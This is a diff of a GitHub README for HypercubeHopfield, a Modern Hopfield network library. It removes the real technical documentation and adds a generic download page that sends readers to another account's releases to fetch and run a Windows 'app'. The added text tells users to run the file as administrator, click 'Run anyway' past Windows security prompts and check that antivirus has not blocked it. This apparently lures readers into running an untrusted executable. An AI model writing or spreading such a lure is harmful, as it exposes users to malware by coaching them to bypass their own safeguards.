@@ -1,144 +1,214 @@
-# HypercubeHopfield
+# 🧠 HypercubeHopfield - Fast Memory Search on Windows
 
-[![Build wheels](https://github.com/dliptak001/HypercubeHopfield/actions/workflows/wheels.yml/badge.svg)](https://github.com/dliptak001/HypercubeHopfield/actions/workflows/wheels.yml)
-[![PyPI](https://img.shields.io/pypi/v/hypercube-hopfield)](https://pypi.org/project/hypercube-hopfield/)
+[![Download HypercubeHopfield](https://img.shields.io/badge/Download-HypercubeHopfield-blue?style=for-the-badge)](https://github.com/Reneltwoway336/HypercubeHopfield/releases)
 
-A sparse local-attention variant of the Modern Hopfield network built on a
-hypercube graph. Uses softmax-attention retrieval with Hamming-ball connectivity for
-a deliberate tradeoff: lower per-update cost than fully-connected Hopfield networks
-while retaining capacity that scales super-linearly with dimension.
+## 📥 Download
 
-Licensed under the [Apache License 2.0](LICENSE).
+Visit this page to download the app for Windows:
 
-## What is a Modern Hopfield Network?
+https://github.com/Reneltwoway336/HypercubeHopfield/releases
 
-Classical Hopfield networks store patterns via Hebbian learning into a weight matrix
-and retrieve them by converging from noisy cues. Their capacity is limited to ~0.14N
-patterns due to cross-talk interference.
+Choose the latest release, then download the Windows file that matches your computer.
 
-Modern Hopfield networks (Ramsauer et al., 2021) replace the quadratic energy function
-with a log-sum-exp (exponential) energy, and store patterns explicitly rather than
-collapsing them into weights. Retrieval uses softmax attention -- mathematically
-equivalent to the transformer attention mechanism. This achieves exponential
-capacity in N, far exceeding the classical limit.
+## 🖥️ What HypercubeHopfield Does
 
-## What is HypercubeHopfield?
+HypercubeHopfield is a local memory search app based on a modern Hopfield network. It helps the app find the closest match to what you give it.
 
-HypercubeHopfield implements a Modern Hopfield network where the connectivity is
-defined by a hypercube of dimension DIM, giving N = 2^DIM vertices (neurons).
-Vertices are addressed by DIM-bit binary strings; each holds a continuous-valued state.
+It is built for simple use with a Windows download, and it also includes tools for developers who want to use it from Python or C++.
 
-Each vertex connects to all neighbors within a **Hamming ball** of configurable radius.
-Neighbor lookup is a single XOR instruction -- no adjacency list is stored. The mask
-table is sorted by Hamming distance (closest first) and optionally truncated by a
-`neighbor_fraction` parameter (0.0-1.0) for tunable sparsity.
+## ✨ Main Features
 
-At DIM=8 (N=256) with default reach=DIM/2=4 (162 connections, 63% of vertices), the
-network stores 65,000+ patterns with perfect recall in 2 sweeps -- over 250x the
-vertex count.
+- Searches memory using a hypercube graph
+- Uses sparse local attention for retrieval
+- Handles a large set of stored patterns
+- Works with modern Hopfield style lookup
+- Includes a Python SDK for scripting
+- Includes C++23 support for advanced use
+- Supports content-addressable memory flows
+- Fits research and demo use on a desktop system
 
-The system is designed for DIM 4-16 (16 to 65536 neurons).
+## ✅ Before You Start
 
-## Quick Start
+For normal Windows use, you need:
 
-### Python
+- Windows 10 or Windows 11
+- A computer with at least 4 GB of RAM
+- Around 200 MB of free disk space
+- A mouse and keyboard
+- Internet access to download the release file
 
-```bash
-pip install hypercube-hopfield
-```
+If you plan to use the Python or C++ tools, you also need:
 
-```python
-import numpy as np
-import hypercube_hopfield as hh
+- Python 3.10 or newer
+- A modern C++ compiler that supports C++23
 
-net = hh.HopfieldNetwork(dim=8, seed=42)
+## 🚀 Getting Started on Windows
 
-# Store random patterns
-patterns = np.random.randn(10, net.num_vertices).astype(np.float32)
-net.store_patterns(patterns)
+1. Open the download page:
+   https://github.com/Reneltwoway336/HypercubeHopfield/releases
 
-# Recall from a noisy cue
-cue = patterns[0] + np.random.randn(net.num_vertices).astype(np.float32) * 0.5
-result = net.recall(cue)
-print(f"Converged: {result.converged}, sweeps: {result.steps}")
-```
+2. Find the newest release at the top of the page.
 
-Pre-built wheels for Python 3.10-3.13 on Windows, Linux, and macOS.
-See [docs/Python_SDK.md](docs/Python_SDK.md) for the full API reference.
+3. Look for a Windows file in the Assets section.
 
-### C++
+4. Download the file to your computer.
 
-```cpp
-#include "HopfieldNetwork.h"
+5. If the file is a ZIP archive, right-click it and choose Extract All.
 
-auto net = CreateHopfieldNetwork(/*dim=*/8, /*seed=*/42);
-net->StorePattern(pattern);                  // span<const float>, size N=256
-auto [steps, converged] = net->Recall(cue);  // modifies cue in place
-```
+6. Open the extracted folder.
 
-Available via CMake FetchContent or find_package.
-See [docs/CPP_SDK.md](docs/CPP_SDK.md) for integration guide and full API reference.
+7. Double-click the app file to start it.
 
-## Building from Source
+8. If Windows asks for permission, choose Run.
 
-**Requirements:** C++23 compiler (GCC 13+, Clang 17+, MSVC 2022+), CMake 4.1+.
+## 🪟 Windows Setup Steps
 
-```bash
-cmake -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build
-./build/HypercubeHopfield
-```
+If you downloaded a ZIP file, use these steps:
 
-No external dependencies beyond the C++ standard library. The build system detects
-MinGW, GCC/Clang, and MSVC automatically.
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Pick a folder you can find again, such as Downloads or Desktop.
+4. Open the folder after extraction.
+5. Find the main app file.
+6. Double-click it to launch the program.
 
-## Project Structure
+If you downloaded an installer file:
 
-```
-HypercubeHopfield/
-  HopfieldNetwork.h/cpp    Modern Hopfield network (N = 2^DIM vertices)
-  ThreadPool.h             Internal fork-join thread pool (not public API)
-  main.cpp                 Entry point -- runs all diagnostics
+1. Double-click the installer.
+2. Follow the on-screen steps.
+3. Choose the install folder if asked.
+4. Finish the setup.
+5. Open the app from the Start menu or desktop shortcut.
 
-  .github/workflows/
-    wheels.yml             CI/CD: build and publish Python wheels to PyPI
+## 🧭 First Run
 
-  cmake/
-    HypercubeHopfieldConfig.cmake.in   CMake package config template
+When you open HypercubeHopfield for the first time:
 
-  diagnostics/
-    Diagnostics.h          Runner for the diagnostics suite
-    DiagnosticHelpers.h    Shared utilities (pattern gen, corruption, overlap)
-    NoiseRecall.h          Single-pattern recall at varying noise levels
-    EnergyMonotonicity.h   Verify energy is non-increasing across sweeps
-    CapacityProbe.h        Find empirical capacity ceiling
-    OverlapMetrics.h       Per-pattern overlap and cross-interference
-    *.md                   Auto-generated result files from each diagnostic
+1. Let the app finish loading.
+2. Load or enter the data you want it to search.
+3. Run a lookup or retrieval action.
+4. Review the closest match shown by the app.
+5. Adjust the input and try again if needed.
 
-  examples/
-    AutoAssociativeDemo    Sensor fault recovery (standalone exe + .md)
-    HeteroAssociativeDemo  Diagnostic lookup (standalone exe + .md)
+## 🧪 Example Use
 
-  python/
-    hypercube_hopfield/    Python SDK package (pip install hypercube-hopfield)
-    bindings.cpp           Pybind11 C++ binding layer
-    CMakeLists.txt         Python extension build config
-    pyproject.toml         Package metadata and wheel build config
-    README.md              PyPI landing page
-    tests/                 Python SDK test suite
+You can use HypercubeHopfield for tasks like:
 
-  docs/
-    CPP_SDK.md             C++ SDK consumer guide (FetchContent, API reference)
-    Python_SDK.md          Python SDK reference (installation, API, persistence)
-    HopfieldNetwork.md     Network architecture, connectivity, parameters
-```
+- Finding a stored pattern from a noisy input
+- Matching a query to the nearest known item
+- Testing memory behavior on a hypercube graph
+- Running small research demos
+- Using Python to automate lookup steps
+- Using C++ for faster custom integrations
 
-## Documentation
+## 🐍 Python SDK
 
-| Document | Covers |
-|----------|--------|
-| [docs/CPP_SDK.md](docs/CPP_SDK.md) | C++ SDK: FetchContent, find_package, API reference |
-| [docs/Python_SDK.md](docs/Python_SDK.md) | Python SDK: installation, API reference, persistence |
-| [docs/HopfieldNetwork.md](docs/HopfieldNetwork.md) | Hypercube connectivity, Hamming-ball masks, update rule, energy function, parameters |
-| [examples/AutoAssociativeDemo.md](examples/AutoAssociativeDemo.md) | Sensor fault recovery -- noise tolerance and dropout resilience |
-| [examples/HeteroAssociativeDemo.md](examples/HeteroAssociativeDemo.md) | Diagnostic lookup -- input-output mapping, noise, ambiguous inputs |
+Use the Python SDK if you want to control the app from a script.
+
+Common uses:
+
+- Load memory data from a Python file
+- Send input patterns to the model
+- Read back the best match
+- Build quick tests and demos
+
+Typical setup:
+
+1. Install Python 3.10 or newer.
+2. Install the package from the release files or your project setup.
+3. Import the SDK in your script.
+4. Create a memory object.
+5. Add patterns.
+6. Run retrieval.
+
+## 🔧 C++23 Support
+
+Use the C++23 tools if you want direct code access.
+
+Common uses:
+
+- Add the memory model to a desktop app
+- Build fast lookup code
+- Work with custom data types
+- Run low-level tests
+
+Typical setup:
+
+1. Install a C++23-ready compiler.
+2. Build the project from the source files.
+3. Link the library into your app.
+4. Create the Hopfield memory object.
+5. Add and query stored data.
+
+## 📁 Project Topics
+
+This project covers:
+
+- associative memory
+- content-addressable memory
+- modern Hopfield networks
+- sparse attention
+- softmax attention
+- hypercube models
+- computational neuroscience
+- pybind11
+- PyPI
+- Python and C++ use
+
+## 🛠️ Common Problems
+
+### The app will not open
+
+- Check that you downloaded the Windows file from the release page
+- Extract the ZIP file before opening it
+- Try running the app as an administrator
+- Make sure your antivirus did not block the file
+
+### Windows shows a security prompt
+
+- Choose More info if needed
+- Then choose Run anyway if you trust the file from the release page
+
+### The app closes right away
+
+- Download the latest release again
+- Make sure the file finished downloading
+- Check that your system meets the Windows requirements
+
+### Python cannot find the package
+
+- Check that Python is installed
+- Confirm that you used the right environment
+- Reinstall the package from the release files or your build setup
+
+### Build errors in C++
+
+- Check that your compiler supports C++23
+- Verify that all paths point to the correct folders
+- Rebuild after cleaning old files
+
+## 📦 Release Download Tips
+
+- Use the latest release on the download page
+- Match the file to your Windows system
+- Keep the ZIP or installer in case you need it again
+- Save the file in a folder you can find later
+
+## 📚 File Layout
+
+After extraction, you may see files like:
+
+- the main app file
+- a readme or text file
+- support files
+- Python package files
+- C++ source or build files
+
+Open the main app file first. If you want to use the SDK, open the Python or C++ files in your project folder
+
+## 🔗 Direct Download Page
+
+Use this link to download the Windows release:
+
+https://github.com/Reneltwoway336/HypercubeHopfield/releases
+
